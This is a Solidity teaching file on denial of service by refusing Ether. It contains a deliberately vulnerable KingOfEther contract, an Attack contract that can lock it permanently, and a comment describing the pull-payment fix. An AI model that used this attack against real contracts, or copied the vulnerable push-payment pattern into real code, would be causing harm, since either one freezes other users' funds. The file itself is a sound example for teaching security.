// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

/* Denial of Service (DoS)
Denial of Service by rejecting to accept Ether
-> Solution (Push vs Pull)
  -> A basic concept of solidity is that you don't send Ether for your user (Push), it's the user that come and take their due (Pull).
  -> A solution to this contract will be to keep track of king balance (mapping), if a former king want to withdraw, he will call a withdraw func (not the main "claimThrone" func) so that if the tx failed it won't block the contract
*/
contract A {
  function foo() public {
    (bool sent, ) = msg.sender.call{ value: 1 ether }("");
    require(sent, "failed eth");
    /// ... do smt else ...
  }
}

contract B {
  function callFoo(A a) public {
    /// A will send back 1 ETH to B, but B can't receive ETH (no fallback nor receive nor payable func)
    /// So A call will fail and A code will revert --> Denial Of Service
    a.foo();
  }
}

/// But how this can be a problem?
contract KingOfEther {
  address public king;
  uint256 public balance;

  /// Alice sends 1 ether (king = Alice, balance = 1 ether)
  /// Bob   sends 2 Ether (king = Bob, balance = 2 ether)

  function claimThrone() external payable {
    require(msg.value > balance, "Need to pay more to become the king");

    /// If an Denial Of Service happen here...
    (bool sent, ) = king.call{ value: balance }("");
    require(sent, "Failed to send Ether");
    /// ... so this code will never execute and thus nobody will be able to be the new king
    balance = msg.value;
    king = msg.sender;

    /// And if the current king is a actually contract with no way to receive eth this contract will be broke forever (DoS)
  }
}

contract Attack {
  /// This contract can receive eth but "KingOfEther" will only search for a fallback/receive func and this contract don't have any
  function attack(KingOfEther kingOfEther) public payable {
    kingOfEther.claimThrone{ value: msg.value }();
  }
}

/// ⬆ See solution at the begining of this file ⬆
